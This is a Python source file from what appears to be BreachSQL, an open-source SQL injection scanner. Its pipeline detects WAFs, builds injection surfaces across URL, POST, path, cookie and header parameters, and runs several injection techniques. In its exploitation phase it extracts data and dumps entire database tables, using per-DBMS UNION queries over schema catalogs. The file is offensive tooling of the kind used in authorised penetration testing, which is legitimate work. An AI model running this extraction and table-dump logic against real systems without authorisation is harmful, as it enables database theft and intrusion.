# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
BreachSQL — engine/_scanner/pipeline.py
Scan pipeline: WAF → passive → surface building → active → time-blind → OOB.
"""

from __future__ import annotations

import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, List

from ..log import get_logger
from .. import crawler as crawler_mod
from ..http import waf_detect
from ..http.injector import Injector, parse_post_data
from ..reporter import ScanResult, ExtractionFinding, TableDumpFinding
from .options import ScanOptions
from .passive import fetch_seed, run_passive_checks
from .active import scan_param
from .blind import run_time_based, run_oob
from .stacked import run_stacked
from .extract import extract_value, extract_via_union
from commonhuman_payloads.sqli import get_extraction_targets

# Separators used when serialising dumped rows; chosen to be absent from normal data
_COL_SEP = "|"
_ROW_SEP = "||~~||"

logger = get_logger("breachsql.pipeline")


def run(url: str, opts: ScanOptions, injector: Injector, result: ScanResult) -> None:

    # 1. WAF detection
    logger.debug("Probing for WAF on %s", url)
    params = injector.get_params(url)
    first_param = params[0] if params else None
    waf_result = waf_detect.detect(injector, url, first_param)

    if waf_result.detected:
        result.waf_detected    = waf_result.name
        result.evasion_applied = waf_result.evasions[0] if waf_result.evasions else None
        logger.warning("WAF detected: %s (confidence: %s)", waf_result.name, waf_result.confidence)
    else:
        logger.debug("No WAF detected")

    evasions: List[str] = waf_result.evasions if waf_result.evasions else ["none"]

    # 2. Passive checks
    seed_resp = fetch_seed(injector, url)
    run_passive_checks(url, seed_resp, injector, result)

    # 3. Build injectable surfaces
    surfaces: List[Dict[str, Any]] = []
    for param in injector.get_params(url):
        surfaces.append({"url": url, "method": "GET", "params": {param: ""}, "single_param": param})

    if opts.data:
        post_params = parse_post_data(opts.data)
        _is_json_body = opts.data.strip().startswith("{")
        for param in post_params:
            surfaces.append({
                "url": url, "method": "POST",
                "params": post_params, "single_param": param,
                "json_body": _is_json_body,
            })

    # Path parameter surfaces — inject into URL path segments.
    # Detect :name / {name} placeholders in the path, or use --path-params names.
    import urllib.parse as _up
    _path_parts = _up.urlparse(url).path.split("/")
    # Map param name -> segment index
    _path_param_indices: dict = {}
    if opts.path_params:
        # User supplied explicit names; match against path parts
        for _i, _part in enumerate(_path_parts):
            # Strip placeholder syntax if present
            _plain = _part.lstrip(":").strip("{}")
            if _plain in opts.path_params:
                _path_param_indices[_plain] = _i
        # Also accept positional names that don't appear literally in the path
        # (e.g. the user knows segment 3 is "id") — use index order as fallback
        for _name in opts.path_params:
            if _name not in _path_param_indices:
                # Prefer numeric-looking segments (REST id values) over word segments
                def _is_numeric(s: str) -> bool:
                    return s.lstrip("-").isdigit()
                # First pass: numeric segments
                for _i, _part in enumerate(_path_parts):
                    if (_i not in _path_param_indices.values() and _part
                            and not _part.startswith("{") and not _part.startswith(":")
                            and _is_numeric(_part)):
                        _path_param_indices[_name] = _i
                        break
                # Second pass: any non-empty non-placeholder segment
                if _name not in _path_param_indices:
                    for _i, _part in enumerate(_path_parts):
                        if (_i not in _path_param_indices.values() and _part
                                and not _part.startswith("{") and not _part.startswith(":")):
                            _path_param_indices[_name] = _i
                            break
    else:
        # Auto-detect :name and {name} patterns
        for _i, _part in enumerate(_path_parts):
            if _part.startswith(":") and len(_part) > 1:
                _path_param_indices[_part[1:]] = _i
            elif _part.startswith("{") and _part.endswith("}"):
                _path_param_indices[_part[1:-1]] = _i

    for _pname, _pidx in _path_param_indices.items():
        surfaces.append({
            "url": url, "method": "PATH",
            "params": {_pname: _path_parts[_pidx]},
            "single_param": _pname,
            "path_index": _pidx,
        })

    # Cookie parameter surfaces — inject into specified cookie names.
    if opts.cookie_params:
        _cookie_jar = injector._session.cookies.get_dict() if hasattr(injector, '_session') else {}
        for _cname in opts.cookie_params:
            _cval = _cookie_jar.get(_cname, "")
            surfaces.append({
                "url": url, "method": "COOKIE",
                "params": {_cname: _cval},
                "single_param": _cname,
            })

    # HTTP header injection surfaces — inject into specified header names.
    if opts.header_params:
        for _hname in opts.header_params:
            surfaces.append({
                "url": url, "method": "HEADER",
                "params": {_hname: ""},
                "single_param": _hname,
            })

    if opts.crawl:
        logger.debug("Crawling %s (max_pages=%s, depth=%s)", url, opts.max_pages, opts.max_depth)
        crawl_result = crawler_mod.crawl(
            start_url=url, injector=injector,
            max_pages=opts.max_pages, max_depth=opts.max_depth, threads=opts.threads,
            exclude_patterns=opts.exclude_patterns or [],
        )
        result.crawled_urls = len(crawl_result.visited_urls)
        logger.debug(
            "Crawled %d URLs, found %d forms",
            result.crawled_urls, len(crawl_result.form_targets),
        )
        for page_url, page_params in crawl_result.url_params:
            for param in page_params:
                surfaces.append({
                    "url": page_url, "method": "GET",
                    "params": {param: ""}, "single_param": param,
                })
        for form in crawl_result.form_targets:
            for param in form.params:
                surfaces.append({
                    "url": form.action, "method": form.method,
                    "params": {**form.base_data, **form.params}, "single_param": param,
                })
        # Level 2: probe numeric path segments discovered via <code> tags or
        # other non-href links (e.g. /api/items/1 → inject into "1").
        if opts.level >= 2:
            seen_path_surfaces: set = set()
            for pp_url in crawl_result.path_param_candidates:
                _pp_parts = _up.urlparse(pp_url).path.split("/")
                for _i, _part in enumerate(_pp_parts):
                    if _part and _part.lstrip("-").isdigit():
                        _key = (pp_url, _i)
                        if _key not in seen_path_surfaces:
                            seen_path_surfaces.add(_key)
                            surfaces.append({
                                "url": pp_url, "method": "PATH",
                                "params": {"id": _part},
                                "single_param": "id",
                                "path_index": _i,
                            })
                        break  # inject only the first numeric segment
    else:
        pass  # crawler not enabled; surfaces already built from URL params and POST data

    # Deduplicate: the BFS crawler re-visits the seed URL, re-adding its params.
    _seen_surfaces: set = set()
    _deduped: list = []
    for _s in surfaces:
        _key = (_s["url"], _s["method"], _s["single_param"])
        if _key not in _seen_surfaces:
            _seen_surfaces.add(_key)
            _deduped.append(_s)
    surfaces = _deduped

    if surfaces:
        logger.info("%d injectable surface(s) identified", len(surfaces))
    else:
        logger.debug("0 injectable surfaces identified")
    result.params_tested = len(surfaces)

    # 4. Active: error-based + boolean + union (threaded)
    if opts.use_error or opts.use_boolean or opts.use_union:
        with ThreadPoolExecutor(max_workers=opts.threads) as pool:
            futs = [
                pool.submit(scan_param, s, evasions, opts, injector, result)
                for s in surfaces
            ]
            for f in as_completed(futs):
                try:
                    f.result()
                except Exception as exc:
                    result.append_error(str(exc))

    # 5. Time-based blind (sequential — timing sensitive, threading skews results)
    if opts.use_time:
        confirmed = {
            (f.url, f.parameter, f.method)
            for lst in (result.error_based, result.boolean_based, result.union_based)
            for f in lst
        }
        time_surfaces = [
            s for s in surfaces
            if (s["url"], s["single_param"], s["method"]) not in confirmed
        ]
        logger.debug("Running time-based blind detection (%d surfaces)", len(time_surfaces))
        for surface in time_surfaces:
            try:
                run_time_based(surface, evasions, opts, injector, result)
            except Exception as exc:
                result.append_error(str(exc))

    # 6. OOB injection (threaded — fire and forget)
    if opts.use_oob:
        logger.info("Injecting OOB payloads (callback: %s)", opts.oob_callback)
        with ThreadPoolExecutor(max_workers=opts.threads) as pool:
            futs = [
                pool.submit(run_oob, s, evasions, opts, injector, result)
                for s in surfaces
            ]
            for f in as_completed(futs):
                try:
                    f.result()
                except Exception as exc:
                    result.append_error(str(exc))

    # 7. Stacked (batched) queries (sequential — order matters for detection)
    if opts.use_stacked:
        logger.debug("Running stacked query detection (%d surfaces)", len(surfaces))
        for surface in surfaces:
            try:
                run_stacked(surface, evasions, opts, injector, result)
            except Exception as exc:
                result.append_error(str(exc))

    # 8. Exploitation — extract proof-of-impact data via confirmed injection
    if opts.exploit and (result.boolean_based or result.time_based
                         or result.union_based or result.error_based):
        _run_exploit(url, opts, evasions, injector, result, surfaces)


def _columns_expr(table: str, dbms: str) -> str:
    """Return a scalar SQL expression that yields comma-separated column names for *table*."""
    if dbms == "sqlite":
        return f"(SELECT GROUP_CONCAT(name,',') FROM pragma_table_info('{table}'))"
    if dbms in ("postgres", "postgresql"):
        return (
            f"(SELECT STRING_AGG(column_name,',' ORDER BY ordinal_position)"
            f" FROM information_schema.columns"
            f" WHERE table_schema='public' AND table_name='{table}')"
        )
    if dbms == "mssql":
        return (
            f"(SELECT STRING_AGG(column_name,',')"
            f" WITHIN GROUP (ORDER BY ordinal_position)"
            f" FROM information_schema.columns WHERE table_name='{table}')"
        )
    if dbms == "oracle":
        return (
            f"(SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_id)"
            f" FROM all_tab_columns WHERE table_name=UPPER('{table}'))"
        )
    # mysql / mariadb / auto
    return (
        f"(SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ',')"
        f" FROM information_schema.columns"
        f" WHERE table_schema=DATABASE() AND table_name='{table}')"
    )


def _dump_expr(table: str, columns: List[str], dbms: str, limit: int = 100) -> str:
    """Return a scalar SQL expression that GROUP_CONCATs all rows from *table*."""
    if not columns:
        return ""
    if dbms == "sqlite":
        # COALESCE required: any NULL in the chain makes the whole row NULL and
        # GROUP_CONCAT silently drops it.  Subquery needed so LIMIT restricts
        # input rows rather than the single aggregate output row.
        cols = f"||'{_COL_SEP}'||".join(f"COALESCE(CAST(\"{c}\" AS TEXT),'')" for c in columns)
        return (
            f"(SELECT GROUP_CONCAT(c,'{_ROW_SEP}')"
            f" FROM (SELECT {cols} AS c FROM \"{table}\" LIMIT {limit}) _t)"
        )
    if dbms in ("postgres", "postgresql"):
        cols = f"||'{_COL_SEP}'||".join(f"COALESCE(CAST(\"{c}\" AS TEXT),'')" for c in columns)
        return (
            f"(SELECT STRING_AGG({cols},'{_ROW_SEP}')"
            f" FROM (SELECT * FROM \"{table}\" LIMIT {limit}) _t)"
        )
    if dbms == "mssql":
        cols = "+'|'+".join(f"ISNULL(CAST([{c}] AS NVARCHAR(MAX)),'')" for c in columns)
        return (
            f"(SELECT STRING_AGG({cols},'{_ROW_SEP}')"
            f" FROM (SELECT TOP {limit} * FROM [{table}]) _t)"
        )
    if dbms == "oracle":
        cols = f"||'{_COL_SEP}'||".join(
            f"NVL(CAST(\"{c}\" AS VARCHAR2(4000)),'')" for c in columns
        )
        return (
            f"(SELECT LISTAGG({cols},'{_ROW_SEP}') WITHIN GROUP (ORDER BY 1)"
            f" FROM (SELECT * FROM \"{table}\" WHERE ROWNUM<={limit}))"
        )
    # mysql / mariadb / auto
    cols = ",".join(f"IFNULL(CAST(`{c}` AS CHAR),'')" for c in columns)
    return (
        f"(SELECT GROUP_CONCAT(CONCAT_WS('{_COL_SEP}',{cols}) SEPARATOR '{_ROW_SEP}')"
        f" FROM (SELECT * FROM `{table}` LIMIT {limit}) _t)"
    )


def _dump_table_union(
    table: str,
    union_finding: Any,
    surface: Dict[str, Any],
    evasions: List[str],
    opts: ScanOptions,
    injector: Injector,
    result: ScanResult,
) -> None:
    """Dump all rows of *table* using the confirmed UNION injection."""
    dbms = (result.dbms_detected or opts.dbms or "auto").lower()

    # Phase 1 — discover columns
    col_expr = _columns_expr(table, dbms)
    cols_raw = extract_via_union(
        expr=col_expr,
        union_finding=union_finding,
        surface=surface,
        evasions=evasions,
        opts=opts,
        injector=injector,
    )
    if not cols_raw:
        logger.warning("dump: could not retrieve columns for table %s", table)
        return
    columns = [c.strip() for c in cols_raw.split(",") if c.strip()]
    logger.info("dump: %s  columns=%s", table, columns)

    # Phase 2 — extract rows
    row_expr = _dump_expr(table, columns, dbms)
    if not row_expr:
        return
    raw = extract_via_union(
        expr=row_expr,
        union_finding=union_finding,
        surface=surface,
        evasions=evasions,
        opts=opts,
        injector=injector,
    )
    rows: List[List[str]] = []
    if raw:
        rows = [r.split(_COL_SEP) for r in raw.split(_ROW_SEP) if r]
    logger.info("dump: %s  rows=%d", table, len(rows))

    result.table_dumps.append(TableDumpFinding(
        table=table,
        columns=columns,
        rows=rows,
        url=union_finding.url,
        parameter=union_finding.parameter,
        method=union_finding.method,
    ))


def _run_exploit(
    url: str,
    opts: ScanOptions,
    evasions: List[str],
    injector: Injector,
    result: ScanResult,
    surfaces: List[Dict[str, Any]],
) -> None:
    """Extract proof-of-impact data and optionally dump tables."""

    dbms = (result.dbms_detected or opts.dbms or "auto").lower()
    targets = get_extraction_targets(dbms)

    # Prefer UNION extraction (one request per target, no binary search)
    if result.union_based:
        union_finding = result.union_based[0]
        surface = next(
            (s for s in surfaces
             if s["url"] == union_finding.url
             and s["single_param"] == union_finding.parameter
             and s["method"] == union_finding.method),
            None,
        )
        if surface is not None:
            logger.info("Extracting %d target(s) via UNION on %s [%s]",
                        len(targets), union_finding.parameter, union_finding.url)
            for label, expr in targets:
                try:
                    value = extract_via_union(
                        expr=expr,
                        union_finding=union_finding,
                        surface=surface,
                        evasions=evasions,
                        opts=opts,
                        injector=injector,
                    )
                    if value:
                        logger.info("[EXTRACTED] %s = %s", label, value)
                        result.extracted.append(ExtractionFinding(
                            url=union_finding.url,
                            parameter=union_finding.parameter,
                            method=union_finding.method,
                            expr=expr,
                            value=value,
                            mode="union",
                        ))
                    else:
                        logger.debug("extract: no value returned for %s", label)
                except Exception as exc:
                    result.append_error(f"Extraction failed ({label}): {exc}")

            # Table dump(s)
            tables_to_dump: List[str] = []
            if opts.dump:
                tables_to_dump.append(opts.dump)
            if opts.dump_all:
                # Re-use the already-extracted tables value when possible
                tables_expr = next((e for lbl, e in targets if lbl == "tables"), None)
                tables_val = next(
                    (f.value for f in result.extracted if f.expr == tables_expr),
                    None,
                )
                if not tables_val and tables_expr:
                    try:
                        tables_val = extract_via_union(
                            expr=tables_expr,
                            union_finding=union_finding,
                            surface=surface,
                            evasions=evasions,
                            opts=opts,
                            injector=injector,
                        )
                    except Exception as exc:
                        result.append_error(f"dump-all: table list extraction failed: {exc}")
                if tables_val:
                    for tbl in tables_val.split(","):
                        tbl = tbl.strip()
                        if tbl and tbl not in tables_to_dump:
                            tables_to_dump.append(tbl)

            for tbl in tables_to_dump:
                try:
                    _dump_table_union(tbl, union_finding, surface, evasions, opts, injector, result)
                except Exception as exc:
                    result.append_error(f"Dump failed ({tbl}): {exc}")

            return

    # Fall back to boolean / time-blind extraction (dump not supported over blind)
    best_finding = None
    mode = "boolean"
    if result.boolean_based:
        best_finding = result.boolean_based[0]
    elif result.time_based:
        best_finding = result.time_based[0]
        mode = "time"

    if best_finding is None:
        return

    surface = next(
        (s for s in surfaces
         if s["url"] == best_finding.url
         and s["single_param"] == best_finding.parameter
         and s["method"] == best_finding.method),
        None,
    )
    if surface is None:
        return

    try:
        from .active import _fetch
        baseline_resp = _fetch(
            injector, best_finding.url, best_finding.method,
            surface["params"], best_finding.parameter, "",
            json_body=surface.get("json_body", False),
            path_index=surface.get("path_index", 0),
        )
        baseline = baseline_resp if baseline_resp is not None else ""
    except Exception:
        baseline = ""

    if opts.dump or opts.dump_all:
        logger.warning(
            "Table dump requires UNION-based injection; no UNION finding available — skipping dump"
        )

    logger.info("Extracting %d target(s) via %s-blind on %s [%s]",
                len(targets), mode, best_finding.parameter, best_finding.url)

    for label, expr in targets:
        try:
            value = extract_value(
                expr=expr,
                surface=surface,
                evasions=evasions,
                opts=opts,
                injector=injector,
                baseline=baseline,
                mode=mode,
            )
            if value:
                logger.info("[EXTRACTED] %s = %s", label, value)
                result.extracted.append(ExtractionFinding(
                    url=best_finding.url,
                    parameter=best_finding.parameter,
                    method=best_finding.method,
                    expr=expr,
                    value=value,
                    mode=mode,
                ))
            else:
                logger.debug("extract: no value returned for %s", label)
        except Exception as exc:
            result.append_error(f"Extraction failed ({label}): {exc}")
